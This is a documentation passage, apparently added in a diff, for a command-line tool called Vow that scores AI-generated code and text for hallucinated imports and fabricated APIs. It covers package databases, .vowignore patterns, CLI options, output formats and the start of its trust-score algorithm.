+<p><em>This page is under development. See <a href="configuration/../reference/cli-reference.html">CLI Reference</a> for all configuration options.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="known-packages"><a class="header" href="#known-packages">Known Packages</a></h1>
+<p>Manage the database of known packages for hallucination detection.</p>
+<h2 id="package-database"><a class="header" href="#package-database">Package Database</a></h2>
+<p>Vow maintains databases of known packages for each language:</p>
+<ul>
+<li><strong>Python</strong>: PyPI packages + standard library</li>
+<li><strong>JavaScript</strong>: NPM packages + Node.js built-ins</li>
+<li><strong>Go</strong>: Go modules + standard library</li>
+<li><strong>Rust</strong>: Crates.io + standard library</li>
+</ul>
+<h2 id="managing-packages"><a class="header" href="#managing-packages">Managing Packages</a></h2>
+<pre><code class="language-bash"># List known packages
+vow packages list --language python
+
+# Update package database
+vow packages update
+
+# Add custom package
+vow packages add my-internal-lib --language python
+</code></pre>
+<h2 id="custom-package-lists-1"><a class="header" href="#custom-package-lists-1">Custom Package Lists</a></h2>
+<pre><code class="language-yaml"># .vow/known-packages.yaml
+custom_packages:
+  python:
+    - name: "internal_utils"
+      versions: ["1.0.0", "1.1.0"]
+  javascript:
+    - name: "@company/shared"
+      versions: ["&gt;=2.0.0"]
+</code></pre>
+<p><em>This page is under development. See <a href="configuration/../analyzers/hallucination-detection.html">Hallucination Detection</a> for detailed examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="vowignore-file"><a class="header" href="#vowignore-file">Vowignore File</a></h1>
+<p>Use <code>.vowignore</code> files to exclude files and directories from analysis, similar to how <code>.gitignore</code> works for Git. This helps improve performance by skipping files that don't need verification.</p>
+<h2 id="basic-usage"><a class="header" href="#basic-usage">Basic Usage</a></h2>
+<p>Create a <code>.vowignore</code> file in your project root:</p>
+<pre><code># Ignore test files
+test_*.py
+*_test.py
+tests/
+
+# Ignore generated code
+generated/
+**/proto/*.py
+build/
+dist/
+
+# Ignore dependencies
+node_modules/
+vendor/
+.venv/
+venv/
+
+# Ignore specific patterns
+*.pb.py
+*_pb2.py
+*.min.js
+*.bundle.js
+
+# Ignore documentation
+docs/
+*.md
+</code></pre>
+<h2 id="syntax"><a class="header" href="#syntax">Syntax</a></h2>
+<p>The <code>.vowignore</code> file uses gitignore-style patterns:</p>
+<ul>
+<li><code>#</code> for comments (ignored lines)</li>
+<li><code>*</code> for single-level wildcards</li>
+<li><code>**</code> for recursive directory matching</li>
+<li><code>!</code> to negate patterns (include what would otherwise be excluded)</li>
+<li><code>/</code> at the end to match directories only</li>
+<li><code>/</code> at the beginning for root-relative paths</li>
+</ul>
+<h3 id="pattern-examples"><a class="header" href="#pattern-examples">Pattern Examples</a></h3>
+<pre><code># Exact file name
+config.json
+
+# File extension
+*.log
+
+# Directory
+logs/
+
+# Files in any subdirectory
+**/cache/*
+
+# Negate pattern - include important configs
+!important.config
+
+# Root-relative path
+/root-only-file.txt
+
+# Multiple levels
+src/**/test/**/*.py
+</code></pre>
+<h2 id="multiple-vowignore-files"><a class="header" href="#multiple-vowignore-files">Multiple Vowignore Files</a></h2>
+<p>Vow supports hierarchical <code>.vowignore</code> files for granular control:</p>
+<ol>
+<li><strong>Global ignore</strong>: <code>~/.config/vow/ignore</code> - applies to all projects</li>
+<li><strong>Project root</strong>: <code>.vowignore</code> - applies to the entire project</li>
+<li><strong>Subdirectories</strong>: <code>subdir/.vowignore</code> - applies only to that subdirectory and below</li>
+</ol>
+<h3 id="precedence"><a class="header" href="#precedence">Precedence</a></h3>
+<p>More specific <code>.vowignore</code> files override more general ones:</p>
+<ul>
+<li>Subdirectory <code>.vowignore</code> overrides project root</li>
+<li>Project root <code>.vowignore</code> overrides global ignore</li>
+<li>Command-line <code>--include</code>/<code>--exclude</code> overrides all files</li>
+</ul>
+<h2 id="common-patterns"><a class="header" href="#common-patterns">Common Patterns</a></h2>
+<h3 id="python-projects"><a class="header" href="#python-projects">Python Projects</a></h3>
+<pre><code># Python
+__pycache__/
+*.pyc
+*.pyo
+*.egg-info/
+build/
+dist/
+.venv/
+venv/
+
+# Testing
+.pytest_cache/
+.coverage
+htmlcov/
+
+# Generated
+*_pb2.py
+*_pb2_grpc.py
+</code></pre>
+<h3 id="javascriptnodejs-projects"><a class="header" href="#javascriptnodejs-projects">JavaScript/Node.js Projects</a></h3>
+<pre><code># Dependencies
+node_modules/
+npm-debug.log*
+yarn-debug.log*
+yarn-error.log*
+
+# Build output
+build/
+dist/
+.next/
+out/
+
+# Generated
+*.min.js
+*.bundle.js
+*.d.ts.map
+</code></pre>
+<h3 id="go-projects"><a class="header" href="#go-projects">Go Projects</a></h3>
+<pre><code># Go build output
+*.exe
+*.exe~
+*.dll
+*.so
+*.dylib
+
+# Test binary
+*.test
+
+# Output of the go coverage tool
+*.out
+
+# Vendor
+vendor/
+</code></pre>
+<h3 id="general-development"><a class="header" href="#general-development">General Development</a></h3>
+<pre><code># IDE files
+.vscode/
+.idea/
+*.swp
+*.swo
+*~
+
+# OS files
+.DS_Store
+Thumbs.db
+
+# Logs
+*.log
+logs/
+
+# Temporary files
+tmp/
+temp/
+*.tmp
+</code></pre>
+<h2 id="performance-impact"><a class="header" href="#performance-impact">Performance Impact</a></h2>
+<p>Using <code>.vowignore</code> effectively can significantly improve Vow's performance:</p>
+<ul>
+<li><strong>Faster scanning</strong>: Skip large directories like <code>node_modules/</code></li>
+<li><strong>Reduced memory usage</strong>: Don't load unnecessary files</li>
+<li><strong>Better focus</strong>: Analyze only relevant source code</li>
+</ul>
+<h3 id="recommended-excludes-for-performance"><a class="header" href="#recommended-excludes-for-performance">Recommended Excludes for Performance</a></h3>
+<pre><code># Large dependency directories
+node_modules/
+vendor/
+.venv/
+venv/
+
+# Build artifacts
+build/
+dist/
+target/
+bin/
+obj/
+
+# Large generated files
+*.min.js
+*.bundle.js
+*.map
+
+# Binary files (automatically skipped, but explicit is clearer)
+*.exe
+*.so
+*.dll
+*.dylib
+*.a
+*.lib
+
+# Media files
+*.jpg
+*.jpeg
+*.png
+*.gif
+*.mp4
+*.mp3
+</code></pre>
+<h2 id="testing-your-patterns"><a class="header" href="#testing-your-patterns">Testing Your Patterns</a></h2>
+<p>You can test your <code>.vowignore</code> patterns by using the verbose flag:</p>
+<pre><code class="language-bash"># See which files are being analyzed
+vow check . --verbose
+
+# Check a specific pattern
+vow check . --exclude "test_*" --verbose
+</code></pre>
+<h2 id="best-practices-2"><a class="header" href="#best-practices-2">Best Practices</a></h2>
+<ol>
+<li><strong>Start simple</strong>: Begin with common patterns and add specific ones as needed</li>
+<li><strong>Use comments</strong>: Document why certain patterns are excluded</li>
+<li><strong>Test regularly</strong>: Verify your patterns aren't excluding important files</li>
+<li><strong>Version control</strong>: Commit <code>.vowignore</code> files to share patterns with your team</li>
+<li><strong>Performance first</strong>: Prioritize excluding large directories and generated files</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="cli-reference"><a class="header" href="#cli-reference">CLI Reference</a></h1>
+<p>This page provides a comprehensive reference for all Vow command-line options and subcommands.</p>
+<h2 id="global-options"><a class="header" href="#global-options">Global Options</a></h2>
+<p>These options are available for all commands:</p>
+<pre><code>--version              Show version information
+--help                 Show help message
+--config &lt;FILE&gt;        Use custom configuration file
+--verbose, -v          Enable verbose output
+--quiet, -q            Suppress non-error output
+--color &lt;WHEN&gt;         When to use color (auto, always, never)
+</code></pre>
+<h2 id="main-commands"><a class="header" href="#main-commands">Main Commands</a></h2>
+<h3 id="vow-check---analyze-files"><a class="header" href="#vow-check---analyze-files"><code>vow check</code> - Analyze Files</a></h3>
+<p>Analyze files, directories, or stdin for AI output issues.</p>
+<h4 id="syntax-1"><a class="header" href="#syntax-1">Syntax</a></h4>
+<pre><code class="language-bash">vow check [OPTIONS] [PATH...]
+vow check --stdin [OPTIONS]
+</code></pre>
+<h4 id="options"><a class="header" href="#options">Options</a></h4>
+<p><strong>Input Options:</strong></p>
+<pre><code>--stdin                    Read from stdin instead of files
+--include &lt;PATTERN&gt;        Include files matching pattern (can be used multiple times)
+--exclude &lt;PATTERN&gt;        Exclude files matching pattern (can be used multiple times)
+--max-file-size &lt;MB&gt;       Skip files larger than SIZE in MB (e.g., 10)
+--max-depth &lt;N&gt;           Maximum directory depth to traverse
+--follow-symlinks          Follow symbolic links
+</code></pre>
+<p><strong>Analyzer Options:</strong></p>
+<pre><code>--analyzers &lt;LIST&gt;         Comma-separated list of analyzers to use
+                          (code, text, security, all)
+--exclude-analyzers &lt;LIST&gt; Analyzers to exclude
+--strictness &lt;LEVEL&gt;       Detection strictness (low, medium, high, paranoid)
+--max-issues &lt;N&gt;          Stop analysis after finding N issues per file
+</code></pre>
+<p><strong>Output Options:</strong></p>
+<pre><code>--format &lt;FORMAT&gt;          Output format (json, sarif, table, html)
+                          Use 'json' for CI/CD integration
+--output &lt;FILE&gt;            Write output to file instead of stdout
+--min-severity &lt;LEVEL&gt;     Minimum severity to report (info, low, medium, high)
+--trust-score-only         Only show trust score, no detailed issues
+--show-context             Include code context around issues
+--quiet, -q               Suppress non-essential output
+--verbose, -v             Enable verbose output with performance details
+--no-color                 Disable colored output
+</code></pre>
+<p><strong>Performance Options:</strong></p>
+<pre><code>--jobs &lt;N&gt;                 Number of parallel jobs (default: CPU count)
+--cache                    Use cache for unchanged files
+--no-cache                 Disable caching
+--timeout &lt;SECONDS&gt;        Maximum time per file (default: 30)
+</code></pre>
+<h4 id="examples"><a class="header" href="#examples">Examples</a></h4>
+<pre><code class="language-bash"># Basic file check
+vow check script.py
+
+# Check directory with specific analyzers
+vow check ./src --analyzers code,security
+
+# Check with custom output format
+vow check . --format sarif --output results.sarif
+
+# Check from stdin
+cat file.py | vow check --stdin --format table
+
+# Check with specific file patterns and size limits
+vow check . --include "*.py" --include "*.js" --exclude "test_*" --max-file-size 5
+
+# High-strictness check for critical code with depth limit
+vow check production/ --strictness high --min-severity medium --max-depth 3
+
+# Fast check with issue limit and quiet output
+vow check . --max-issues 10 --quiet --format json
+
+# Verbose check with performance summary
+vow check . --verbose --max-depth 2 --max-file-size 10
+</code></pre>
+<h3 id="vow-setup---initialize-and-configure"><a class="header" href="#vow-setup---initialize-and-configure"><code>vow setup</code> - Initialize and Configure</a></h3>
+<p>Download models and set up Vow for first use.</p>
+<h4 id="syntax-2"><a class="header" href="#syntax-2">Syntax</a></h4>
+<pre><code class="language-bash">vow setup [OPTIONS]
+</code></pre>
+<h4 id="options-1"><a class="header" href="#options-1">Options</a></h4>
+<pre><code>--models &lt;LIST&gt;           Models to download (code,text,security,all)
+--model-size &lt;SIZE&gt;       Model size to download (small,medium,large)
+--mirror &lt;REGION&gt;         Download mirror (us,eu,cn)
+--no-verify              Skip model integrity verification
+--offline                Install using cached/bundled models only
+--force                  Reinstall even if models exist
+</code></pre>
+<h4 id="examples-1"><a class="header" href="#examples-1">Examples</a></h4>
+<pre><code class="language-bash"># Download all default models
+vow setup
+
+# Download specific models only
+vow setup --models code,security
+
+# Use European mirror
+vow setup --mirror eu
+
+# Reinstall models
+vow setup --force
+</code></pre>
+<h3 id="vow-config---configuration-management"><a class="header" href="#vow-config---configuration-management"><code>vow config</code> - Configuration Management</a></h3>
+<p>Manage Vow configuration files and settings.</p>
+<h4 id="syntax-3"><a class="header" href="#syntax-3">Syntax</a></h4>
+<pre><code class="language-bash">vow config &lt;SUBCOMMAND&gt; [OPTIONS]
+</code></pre>
+<h4 id="subcommands"><a class="header" href="#subcommands">Subcommands</a></h4>
+<p><strong><code>vow config show</code></strong> - Display current configuration</p>
+<pre><code class="language-bash">vow config show [--format json|yaml|table]
+</code></pre>
+<p><strong><code>vow config init</code></strong> - Create configuration file</p>
+<pre><code class="language-bash">vow config init [--global] [--template &lt;TEMPLATE&gt;]
+</code></pre>
+<p><strong><code>vow config validate</code></strong> - Validate configuration</p>
+<pre><code class="language-bash">vow config validate [&lt;CONFIG_FILE&gt;]
+</code></pre>
+<p><strong><code>vow config edit</code></strong> - Open configuration in editor</p>
+<pre><code class="language-bash">vow config edit [--global]
+</code></pre>
+<h4 id="examples-2"><a class="header" href="#examples-2">Examples</a></h4>
+<pre><code class="language-bash"># Show current configuration
+vow config show
+
+# Create project configuration file
+vow config init
+
+# Create global configuration
+vow config init --global
+
+# Validate custom config file
+vow config validate my-config.yaml
+</code></pre>
+<h3 id="vow-analyzers---analyzer-management"><a class="header" href="#vow-analyzers---analyzer-management"><code>vow analyzers</code> - Analyzer Management</a></h3>
+<p>List, install, and manage analyzers.</p>
+<h4 id="syntax-4"><a class="header" href="#syntax-4">Syntax</a></h4>
+<pre><code class="language-bash">vow analyzers &lt;SUBCOMMAND&gt; [OPTIONS]
+</code></pre>
+<h4 id="subcommands-1"><a class="header" href="#subcommands-1">Subcommands</a></h4>
+<p><strong><code>vow analyzers list</code></strong> - List available analyzers</p>
+<pre><code class="language-bash">vow analyzers list [--installed-only]
+</code></pre>
+<p><strong><code>vow analyzers install</code></strong> - Install custom analyzer</p>
+<pre><code class="language-bash">vow analyzers install &lt;WASM_FILE&gt; [--name &lt;NAME&gt;]
+</code></pre>
+<p><strong><code>vow analyzers remove</code></strong> - Remove analyzer</p>
+<pre><code class="language-bash">vow analyzers remove &lt;NAME&gt;
+</code></pre>
+<p><strong><code>vow analyzers validate</code></strong> - Validate analyzers</p>
+<pre><code class="language-bash">vow analyzers validate [&lt;ANALYZER&gt;]
+</code></pre>
+<h4 id="examples-3"><a class="header" href="#examples-3">Examples</a></h4>
+<pre><code class="language-bash"># List all analyzers
+vow analyzers list
+
+# Install custom analyzer
+vow analyzers install my-analyzer.wasm --name custom
+
+# Remove analyzer
+vow analyzers remove custom
+</code></pre>
+<h3 id="vow-packages---package-database-management"><a class="header" href="#vow-packages---package-database-management"><code>vow packages</code> - Package Database Management</a></h3>
+<p>Manage known package databases for hallucination detection.</p>
+<h4 id="syntax-5"><a class="header" href="#syntax-5">Syntax</a></h4>
+<pre><code class="language-bash">vow packages &lt;SUBCOMMAND&gt; [OPTIONS]
+</code></pre>
+<h4 id="subcommands-2"><a class="header" href="#subcommands-2">Subcommands</a></h4>
+<p><strong><code>vow packages list</code></strong> - List known packages</p>
+<pre><code class="language-bash">vow packages list [--language &lt;LANG&gt;] [--search &lt;PATTERN&gt;]
+</code></pre>
+<p><strong><code>vow packages update</code></strong> - Update package database</p>
+<pre><code class="language-bash">vow packages update [--language &lt;LANG&gt;] [--source &lt;SOURCE&gt;]
+</code></pre>
+<p><strong><code>vow packages add</code></strong> - Add custom package</p>
+<pre><code class="language-bash">vow packages add &lt;PACKAGE&gt; --language &lt;LANG&gt; [--version &lt;VER&gt;]
+</code></pre>
+<p><strong><code>vow packages export</code></strong> - Export package list</p>
+<pre><code class="language-bash">vow packages export &lt;FILE&gt; [--language &lt;LANG&gt;]
+</code></pre>
+<p><strong><code>vow packages import</code></strong> - Import package list</p>
+<pre><code class="language-bash">vow packages import &lt;FILE&gt; [--merge]
+</code></pre>
+<h4 id="examples-4"><a class="header" href="#examples-4">Examples</a></h4>
+<pre><code class="language-bash"># List Python packages
+vow packages list --language python
+
+# Search for specific packages
+vow packages list --search "requests"
+
+# Update all package databases
+vow packages update
+
+# Add internal package
+vow packages add company-utils --language python --version "1.0.0"
+
+# Export team package list
+vow packages export team-packages.yaml
+</code></pre>
+<h3 id="vow-rules---rule-management"><a class="header" href="#vow-rules---rule-management"><code>vow rules</code> - Rule Management</a></h3>
+<p>Manage custom detection rules.</p>
+<h4 id="syntax-6"><a class="header" href="#syntax-6">Syntax</a></h4>
+<pre><code class="language-bash">vow rules &lt;SUBCOMMAND&gt; [OPTIONS]
+</code></pre>
+<h4 id="subcommands-3"><a class="header" href="#subcommands-3">Subcommands</a></h4>
+<p><strong><code>vow rules list</code></strong> - List available rules</p>
+<pre><code class="language-bash">vow rules list [--builtin] [--custom]
+</code></pre>
+<p><strong><code>vow rules validate</code></strong> - Validate rule file</p>
+<pre><code class="language-bash">vow rules validate &lt;RULE_FILE&gt;
+</code></pre>
+<p><strong><code>vow rules test</code></strong> - Test rules against sample code</p>
+<pre><code class="language-bash">vow rules test &lt;RULE_FILE&gt; &lt;CODE_FILE&gt;
+</code></pre>
+<p><strong><code>vow rules create</code></strong> - Create rule template</p>
+<pre><code class="language-bash">vow rules create &lt;NAME&gt; [--template &lt;TYPE&gt;]
+</code></pre>
+<h4 id="examples-5"><a class="header" href="#examples-5">Examples</a></h4>
+<pre><code class="language-bash"># List all rules
+vow rules list
+
+# Validate custom rules
+vow rules validate my-rules.yaml
+
+# Test rules against sample
+vow rules test my-rules.yaml sample.py
+
+# Create new rule template
+vow rules create detect-deprecated --template python
+</code></pre>
+<h2 id="exit-codes"><a class="header" href="#exit-codes">Exit Codes</a></h2>
+<p>Vow uses these exit codes:</p>
+<div class="table-wrapper"><table><thead><tr><th>Code</th><th>Meaning</th></tr></thead><tbody>
+<tr><td>0</td><td>Success, no issues found</td></tr>
+<tr><td>1</td><td>Issues found (severity depends on --min-severity)</td></tr>
+<tr><td>2</td><td>Configuration error</td></tr>
+<tr><td>3</td><td>Model/analyzer error</td></tr>
+<tr><td>4</td><td>File I/O error</td></tr>
+<tr><td>5</td><td>Network error (during setup/updates)</td></tr>
+<tr><td>10</td><td>Internal error</td></tr>
+</tbody></table>
+</div>
+<h2 id="environment-variables"><a class="header" href="#environment-variables">Environment Variables</a></h2>
+<p>Configure Vow behavior with environment variables:</p>
+<pre><code class="language-bash"># Configuration
+VOW_CONFIG_FILE=/path/to/config.yaml    # Default config file
+VOW_DATA_DIR=/path/to/data               # Data directory
+VOW_CACHE_DIR=/path/to/cache             # Cache directory
+
+# Output
+VOW_NO_COLOR=1                           # Disable colored output
+VOW_QUIET=1                              # Suppress output
+VOW_VERBOSE=1                            # Enable verbose output
+
+# Performance
+VOW_JOBS=4                               # Parallel jobs
+VOW_TIMEOUT=60                           # Timeout per file (seconds)
+VOW_MAX_FILE_SIZE=10                     # Maximum file size (MB)
+VOW_MAX_DEPTH=10                         # Maximum directory depth
+VOW_MAX_ISSUES=100                       # Maximum issues per file
+
+# Network
+VOW_OFFLINE=1                            # Disable network requests
+VOW_PROXY=http://proxy.example.com:8080  # HTTP proxy
+VOW_MIRROR=eu                            # Download mirror
+
+# Models
+VOW_MODEL_SIZE=small                     # Default model size
+VOW_NO_ML=1                             # Disable ML models
+</code></pre>
+<h2 id="configuration-files"><a class="header" href="#configuration-files">Configuration Files</a></h2>
+<p>Vow looks for configuration files in this order:</p>
+<ol>
+<li>File specified by <code>--config</code> or <code>VOW_CONFIG_FILE</code></li>
+<li><code>.vow.yaml</code> in current directory</li>
+<li><code>.vow.yaml</code> in parent directories (walking up)</li>
+<li><code>~/.config/vow/config.yaml</code> (user config)</li>
+<li><code>/etc/vow/config.yaml</code> (system config)</li>
+</ol>
+<h2 id="shell-completion"><a class="header" href="#shell-completion">Shell Completion</a></h2>
+<p>Generate shell completion scripts:</p>
+<pre><code class="language-bash"># Bash
+vow completion bash &gt; /etc/bash_completion.d/vow
+
+# Zsh
+vow completion zsh &gt; ~/.zfunc/_vow
+
+# Fish
+vow completion fish &gt; ~/.config/fish/completions/vow.fish
+
+# PowerShell
+vow completion powershell &gt; vow.ps1
+</code></pre>
+<h2 id="api-mode"><a class="header" href="#api-mode">API Mode</a></h2>
+<p>Run Vow as a daemon for IDE integration:</p>
+<pre><code class="language-bash"># Start API server
+vow daemon --port 8080 --bind 127.0.0.1
+
+# Check API status
+curl http://localhost:8080/status
+
+# Analyze via API
+curl -X POST http://localhost:8080/check \
+  -H "Content-Type: application/json" \
+  -d '{"code": "import fake_lib", "language": "python"}'
+</code></pre>
+<h2 id="debug-mode"><a class="header" href="#debug-mode">Debug Mode</a></h2>
+<p>Enable debug mode for troubleshooting:</p>
+<pre><code class="language-bash"># Debug specific analyzer
+vow check file.py --debug-analyzer code
+
+# Full debug output
+vow check file.py --debug
+
+# Trace mode (very verbose)
+VOW_LOG_LEVEL=trace vow check file.py
+</code></pre>
+<h2 id="next-steps-4"><a class="header" href="#next-steps-4">Next Steps</a></h2>
+<ul>
+<li><a href="reference/../configuration/config-file.html">Configuration File</a> - Detailed configuration options</li>
+<li><a href="reference/output-formats.html">Output Formats</a> - Understanding output formats</li>
+<li><a href="reference/exit-codes.html">Exit Codes</a> - Detailed exit code reference</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="output-formats"><a class="header" href="#output-formats">Output Formats</a></h1>
+<p>Vow supports multiple output formats optimized for different use cases, from human consumption to CI/CD automation.</p>
+<h2 id="available-formats"><a class="header" href="#available-formats">Available Formats</a></h2>
+<h3 id="json-format---format-json"><a class="header" href="#json-format---format-json">JSON Format (<code>--format json</code>)</a></h3>
+<pre><code class="language-bash">vow check . --format json
+</code></pre>
+<p>Machine-readable format ideal for CI/CD pipelines, automation scripts, and programmatic processing. Includes performance summaries and detailed issue information.</p>
+<h3 id="table-format---format-table"><a class="header" href="#table-format---format-table">Table Format (<code>--format table</code>)</a></h3>
+<pre><code class="language-bash">vow check . --format table
+</code></pre>
+<p>Human-readable tabular output for terminal usage with color-coded severity levels and trust scores.</p>
+<h3 id="sarif-format---format-sarif"><a class="header" href="#sarif-format---format-sarif">SARIF Format (<code>--format sarif</code>)</a></h3>
+<pre><code class="language-bash">vow check . --format sarif
+</code></pre>
+<p>Static Analysis Results Interchange Format - standardized format for security tools and IDE integration.</p>
+<h3 id="html-format---format-html"><a class="header" href="#html-format---format-html">HTML Format (<code>--format html</code>)</a></h3>
+<pre><code class="language-bash">vow check . --format html --output report.html
+</code></pre>
+<p>Rich HTML report with interactive features, filtering, and embedded CSS for standalone viewing.</p>
+<h2 id="format-examples"><a class="header" href="#format-examples">Format Examples</a></h2>
+<h3 id="json-output-recommended-for-cicd"><a class="header" href="#json-output-recommended-for-cicd">JSON Output (Recommended for CI/CD)</a></h3>
+<pre><code class="language-json">{
+  "files": [
+    {
+      "path": "script.py",
+      "trust_score": 0.7,
+      "language": "python",
+      "size_bytes": 1247,
+      "issues": [
+        {
+          "rule": "hallucinated-import",
+          "severity": "high",
+          "message": "Import 'nonexistent_lib' not found in known packages",
+          "line": 2,
+          "column": 1,
+          "context": "from nonexistent_lib import magic_function",
+          "suggestion": "Verify this import exists or add to known packages"
+        },
+        {
+          "rule": "suspicious-api",
+          "severity": "medium",
+          "message": "API endpoint may be fabricated",
+          "line": 6,
+          "column": 25,
+          "context": "requests.get('https://api.fake.com/users')"
+        }
+      ]
+    }
+  ],
+  "summary": {
+    "total_files": 1,
+    "files_analyzed": 1,
+    "files_with_issues": 1,
+    "total_issues": 2,
+    "trust_score_avg": 0.7,
+    "issues_by_severity": {
+      "high": 1,
+      "medium": 1,
+      "low": 0,
+      "info": 0
+    }
+  },
+  "performance": {
+    "duration_ms": 152,
+    "files_per_second": 35.2,
+    "bytes_processed": 1247,
+    "skipped_files": 0,
+    "memory_usage_mb": 12.4
+  },
+  "metadata": {
+    "vow_version": "1.2.0",
+    "scan_time": "2024-01-15T10:30:45Z",
+    "analyzers_used": ["code", "text", "security"],
+    "languages_detected": ["python"]
+  }
+}
+</code></pre>
+<h3 id="table-output"><a class="header" href="#table-output">Table Output</a></h3>
+<pre><code>┌─────────────────┬──────────────┬──────────┬─────────────────────────────────────────────┐
+│ File            │ Line:Col     │ Severity │ Issue                                       │
+├─────────────────┼──────────────┼──────────┼─────────────────────────────────────────────┤
+│ script.py       │ 2:1          │ HIGH     │ Import 'nonexistent_lib' not found         │
+│ script.py       │ 6:25         │ MEDIUM   │ API endpoint may be fabricated              │
+└─────────────────┴──────────────┴──────────┴─────────────────────────────────────────────┘
+
+Summary:
+  Files analyzed: 1 (35.2 files/sec)
+  Issues found: 2
+  Trust Score: 0.7/1.0 (Medium confidence)
+  Duration: 152ms
+</code></pre>
+<h3 id="sarif-output"><a class="header" href="#sarif-output">SARIF Output</a></h3>
+<pre><code class="language-json">{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Vow",
+          "version": "1.2.0",
+          "informationUri": "https://getvow.dev"
+        }
+      },
+      "results": [
+        {
+          "ruleId": "hallucinated-import",
+          "level": "error",
+          "message": {
+            "text": "Import 'nonexistent_lib' not found in known packages"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "script.py"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 1
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+</code></pre>
+<h2 id="performance-summaries"><a class="header" href="#performance-summaries">Performance Summaries</a></h2>
+<p>All output formats include performance summaries when using <code>--verbose</code>:</p>
+<h3 id="key-metrics"><a class="header" href="#key-metrics">Key Metrics</a></h3>
+<ul>
+<li><strong>Files per second</strong>: Processing throughput</li>
+<li><strong>Duration</strong>: Total analysis time</li>
+<li><strong>Memory usage</strong>: Peak memory consumption</li>
+<li><strong>Files skipped</strong>: Files excluded by .vowignore or filters</li>
+<li><strong>Bytes processed</strong>: Total content analyzed</li>
+</ul>
+<h3 id="cicd-integration-2"><a class="header" href="#cicd-integration-2">CI/CD Integration</a></h3>
+<p>The JSON format is optimized for CI/CD workflows:</p>
+<pre><code class="language-yaml"># GitHub Actions example
+- name: Run Vow Analysis
+  run: vow check . --format json --output results.json
+  
+- name: Process Results
+  run: |
+    ISSUES=$(jq '.summary.total_issues' results.json)
+    if [ "$ISSUES" -gt 0 ]; then
+      echo "Found $ISSUES issues in AI-generated content"
+      exit 1
+    fi
+</code></pre>
+<h2 id="format-selection-guide"><a class="header" href="#format-selection-guide">Format Selection Guide</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Use Case</th><th>Recommended Format</th><th>Rationale</th></tr></thead><tbody>
+<tr><td>Terminal usage</td><td><code>table</code></td><td>Human-readable, color-coded</td></tr>
+<tr><td>CI/CD pipelines</td><td><code>json</code></td><td>Machine-readable, complete data</td></tr>
+<tr><td>Security tools</td><td><code>sarif</code></td><td>Industry standard format</td></tr>
+<tr><td>Reports &amp; sharing</td><td><code>html</code></td><td>Rich presentation, self-contained</td></tr>
+<tr><td>IDE integration</td><td><code>sarif</code></td><td>Native support in most IDEs</td></tr>
+<tr><td>Scripting</td><td><code>json</code></td><td>Easy to parse with standard tools</td></tr>
+</tbody></table>
+</div>
+<h2 id="output-options"><a class="header" href="#output-options">Output Options</a></h2>
+<p>Control output verbosity and content:</p>
+<pre><code class="language-bash"># Minimal output - just issues
+vow check . --quiet --format json
+
+# Verbose output - includes performance data  
+vow check . --verbose --format table
+
+# Only trust scores
+vow check . --trust-score-only
+
+# Include code context
+vow check . --show-context --format json
+
+# Filter by severity
+vow check . --min-severity medium --format table
+</code></pre>
+<h2 id="file-output"><a class="header" href="#file-output">File Output</a></h2>
+<p>Save results to files for later analysis:</p>
+<pre><code class="language-bash"># Save JSON results
+vow check . --format json --output analysis.json
+
+# Save HTML report
+vow check . --format html --output report.html
+
+# Save SARIF for security tools
+vow check . --format sarif --output vow-results.sarif
+</code></pre>
+<hr />
+<p>For more output customization options, see the <a href="reference/cli-reference.html">CLI Reference</a>.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="trust-score-algorithm"><a class="header" href="#trust-score-algorithm">Trust Score Algorithm</a></h1>
+<p>The trust score is Vow's quantitative measure of confidence in AI-generated content. It ranges from 0.0 (very low confidence) to 1.0 (high confidence) and helps you prioritize which outputs need human review.</p>
+<h2 id="how-trust-scores-work"><a class="header" href="#how-trust-scores-work">How Trust Scores Work</a></h2>
+<h3 id="basic-formula"><a class="header" href="#basic-formula">Basic Formula</a></h3>
+<pre><code>Trust Score = weighted_average(analyzer_scores) × confidence_multiplier
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><strong>Analyzer Scores</strong>: Individual confidence ratings from each analyzer</li>
+<li><strong>Weights</strong>: Importance weighting for each analyzer</li>
+<li><strong>Confidence Multiplier</strong>: Adjustment based on detection certainty</li>
+</ul>
+<h3 id="default-weights"><a class="header" href="#default-weights">Default Weights</a></h3>
+<div class="table-wrapper"><table><thead><tr><th>Analyzer</th><th>Weight</th><th>Rationale</th></tr></thead><tbody>
+<tr><td>Code</td><td>40%</td><td>Code issues are objective and verifiable</td></tr>
+<tr><td>Text</td><td>35%</td><td>Text analysis has good accuracy but some subjectivity</td></tr>
+<tr><td>Security</td><td>25%</td><td>Security issues are critical but less frequent</td></tr>
+</tbody></table>
+</div>
+<h2 id="analyzer-specific-scoring"><a class="header" href="#analyzer-specific-scoring">Analyzer-Specific Scoring</a></h2>
+<h3 id="code-analyzer-scoring"><a class="header" href="#code-analyzer-scoring">Code Analyzer Scoring</a></h3>
+<p>The code analyzer evaluates several factors:</p>
+<pre><code class="language-yaml">code_factors:
+  syntax_correctness: 25%     # Valid syntax and structure
+  import_validity: 30%        # All imports are real packages
+  api_authenticity: 25%       # Function/method calls exist
+  pattern_consistency: 20%    # Follows common coding patterns
+</code></pre>
+<p><strong>Examples:</strong></p>
+<pre><code class="language-python"># High trust score (0.9+)
+import requests
+import json
+
+def get_user(user_id):
+    response = requests.get(f"https://api.github.com/users/{user_id}")
+    return response.json()
+</code></pre>
+<pre><code class="language-python"># Low trust score (0.3-)
+import fake_requests_lib
+import nonexistent_module
+
+def magic_function():
+    data = fake_requests_lib.auto_get_everything()
+    return nonexistent_module.process_magically(data)
+</code></pre>
+<h3 id="text-analyzer-scoring"><a class="header" href="#text-analyzer-scoring">Text Analyzer Scoring</a></h3>
+<p>Text analysis considers:</p>
+<pre><code class="language-yaml">text_factors:
+  factual_consistency: 35%    # Statements align with known facts
+  reference_validity: 25%     # URLs, citations are real
